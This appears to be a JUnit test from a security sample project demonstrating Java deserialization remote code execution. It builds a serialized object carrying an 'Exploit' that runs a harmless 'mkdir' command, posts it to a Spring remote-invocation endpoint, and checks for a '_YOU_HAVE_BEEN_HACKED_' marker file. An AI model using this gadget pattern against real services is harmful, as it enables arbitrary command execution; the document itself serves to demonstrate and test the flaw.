package com.ttulka.security.sample.spring;

import java.nio.file.Files;
import java.nio.file.Path;

import com.ttulka.security.Exploit;
import com.ttulka.security.sample.Vunerable;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.web.server.LocalServerPort;

import static com.ttulka.security.SerializationUtils.serialize;
import static com.ttulka.security.sample.spring.Application.SERVICE_PATH;
import static io.restassured.RestAssured.given;
import static java.util.concurrent.TimeUnit.SECONDS;
import static org.awaitility.Awaitility.await;

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class RemoteInvocationTest {

    @Test
    void remote_invocation_is_hacked(@LocalServerPort int port, @TempDir Path tempDir) throws Exception {
        Path exploitFile = tempDir.resolve("exploit.ser" + RemoteInvocationTest.class.getSimpleName());
        Path hackedFile = tempDir.resolve("_YOU_HAVE_BEEN_HACKED_" + RemoteInvocationTest.class.getSimpleName());

        createExploit(exploitFile, hackedFile);

        given()
                .port(port)
                .contentType("application/x-java-serialized-object")
                .body(Files.newInputStream(exploitFile)).
                when()
                .post(SERVICE_PATH).
                then()
                .statusCode(500);

        await().atMost(2, SECONDS)
                .until(() -> Files.exists(hackedFile));
    }

    private void createExploit(Path exploitFile, Path hackedFile) throws Exception {
        Vunerable vunerable = new Vunerable();
        vunerable.setProperty(new Exploit("mkdir " + hackedFile.toAbsolutePath()));

        serialize(vunerable, exploitFile);
    }
}
